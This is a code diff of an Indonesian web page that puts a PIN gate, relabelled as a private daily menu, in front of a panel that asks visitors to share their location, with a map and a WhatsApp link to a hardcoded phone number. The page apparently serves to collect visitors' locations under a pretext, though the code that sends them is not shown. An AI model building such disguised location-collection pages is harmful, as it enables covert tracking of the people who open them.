@@ -9,24 +9,23 @@
 </head>
 <body>
 
-<div class="box" id="pinBox">
-  <h2>Masukkan PIN</h2>
-  <p>Untuk melanjutkan, silakan masukkan PIN</p>
-  <input type="password" id="pinInput" placeholder="PIN">
-  <button onclick="cekPIN()">Lanjutkan</button>
-  <p id="pinStatus"></p>
+<div class="card" id="pinBox">
+  <h1>Menu Buka Hari Ini</h1>
+  <p class="subtitle">Akses private • Masukkan PIN</p>
+
+  <input type="password" id="pinInput" placeholder="Masukkan PIN" inputmode="numeric">
+  <button onclick="cekPin()">Buka Menu</button>
+
+  <p class="error" id="error">PIN salah, coba lagi</p>
 </div>
 
-<div class="box" id="mainBox" style="display:none;">
-  <h2>Informasi Hari Ini</h2>
-  <p>Aktifkan lokasi untuk menampilkan informasi terdekat.</p>
-
-  <button onclick="ambilLokasi()">Lanjutkan</button>
-
-  <div id="map"></div>
-  <a id="waBtn" target="_blank"></a>
+<div class="card loading" id="loading">
+  <div class="spinner"></div>
+  <p>Memproses permintaan…</p>
 </div>
 
+</body>
+  
 <script>
 const BENAR = "0808"; //
 const n = "6285781132839";
@@ -87,4 +86,5 @@ function ambilLokasi() {
 </body>
 
 </html>
+
 
